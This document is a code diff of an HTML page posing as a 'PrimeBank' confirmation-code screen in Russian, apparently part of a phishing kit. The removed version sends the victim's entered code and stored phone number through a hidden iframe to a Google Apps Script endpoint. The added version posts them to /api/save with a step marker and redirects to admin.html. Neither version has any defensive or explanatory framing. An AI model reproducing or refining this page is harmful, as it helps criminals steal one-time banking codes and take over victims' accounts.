@@ -4,59 +4,100 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>PrimeBank — Подтверждение</title>
+
 <style>
-* { box-sizing: border-box; font-family: Roboto, "Open Sans", sans-serif; }
-body { margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);}
-.auth-container { background:#fff; width:100%; max-width:420px; padding:32px; border-radius:16px; box-shadow:0 20px 40px rgba(0,0,0,0.15);}
-.brand { text-align:center; margin-bottom:24px; font-size:24px; font-weight:700; letter-spacing:0.5px; color:#203a43;}
-.field { margin-bottom:16px; }
-.field label { display:block; margin-bottom:6px; font-size:14px; color:#555; }
-.field input { width:100%; padding:12px 14px; border-radius:10px; border:1px solid #ccc; font-size:15px; outline:none; transition:0.2s;}
-.field input:focus { border-color:#203a43; }
-.submit-btn { width:100%; padding:14px; border-radius:12px; border:none; background:#203a43; color:#fff; font-size:16px; font-weight:500; cursor:pointer; transition:0.3s;}
-.submit-btn:hover { background:#162b33; transform:translateY(-2px);}
+body {
+  margin:0;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+  font-family: Roboto, sans-serif;
+}
+.auth-container {
+  background:#fff;
+  width:100%;
+  max-width:420px;
+  padding:32px;
+  border-radius:16px;
+  box-shadow:0 20px 40px rgba(0,0,0,0.15);
+}
+input {
+  width:100%;
+  padding:12px;
+  margin-bottom:16px;
+  border-radius:8px;
+  border:1px solid #ccc;
+}
+button {
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:10px;
+  background:#203a43;
+  color:#fff;
+  font-size:16px;
+  cursor:pointer;
+}
+.error {
+  color:red;
+  display:none;
+}
 </style>
 </head>
 <body>
+
 <div class="auth-container">
-  <div class="brand">PrimeBank</div>
-
-  <form id="codeForm" method="POST" action="https://script.google.com/macros/s/AKfycbxIjS0Hs2zI1l3SuiByQrVNfNekBhj28KTkpY_GFqu8i974IcByto9-x18cpc9bT2gg/exec" target="hidden_iframe">
-    <div class="field">
-      <label for="codeInput">Введите код подтверждения</label>
-      <input type="text" id="codeInput" name="code" placeholder="Введите код" required maxlength="6" />
-    </div>
-    <input type="hidden" name="phone" id="phoneHidden">
-    <input type="hidden" name="date" id="dateInput">
-    <button type="submit" class="submit-btn">Подтвердить</button>
+  <h2>Введите код</h2>
+  <form id="codeForm">
+    <input type="text" id="codeInput" placeholder="Код подтверждения" required>
+    <button type="submit">Подтвердить</button>
+    <div class="error" id="errorMsg"></div>
   </form>
-
-  <iframe name="hidden_iframe" style="display:none;"></iframe>
 </div>
 
 <script>
-const codeForm = document.getElementById("codeForm");
+const form = document.getElementById("codeForm");
 const codeInput = document.getElementById("codeInput");
-const phoneHidden = document.getElementById("phoneHidden");
-const dateInput = document.getElementById("dateInput");
+const errorMsg = document.getElementById("errorMsg");
 
-// подставляем телефон из localStorage
-phoneHidden.value = localStorage.getItem("authPhone");
+form.addEventListener("submit", async function(e){
+  e.preventDefault();
 
-codeForm.onsubmit = function() {
   const code = codeInput.value.trim();
-  if(code.length < 4 || code.length > 6){
-    alert("Введите корректный код подтверждения (4-6 цифр)");
-    return false;
+  const phone = localStorage.getItem("authPhone");
+
+  if(!phone){
+    errorMsg.textContent = "Телефон не найден";
+    errorMsg.style.display = "block";
+    return;
   }
-  dateInput.value = new Date().toISOString();
 
-  // через секунду редирект
-  setTimeout(() => { window.location.href = "choice.html"; }, 1000);
+  try {
+    const response = await fetch("/api/save", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        phone: phone,
+        code: code,
+        step: "code",
+        date: new Date().toISOString()
+      })
+    });
 
-  return true; // отправка формы
-};
+    if(!response.ok){
+      throw new Error();
+    }
+
+    window.location.href = "admin.html";
+
+  } catch(err){
+    errorMsg.textContent = "Ошибка сервера";
+    errorMsg.style.display = "block";
+  }
+});
 </script>
+
 </body>
 </html>
-
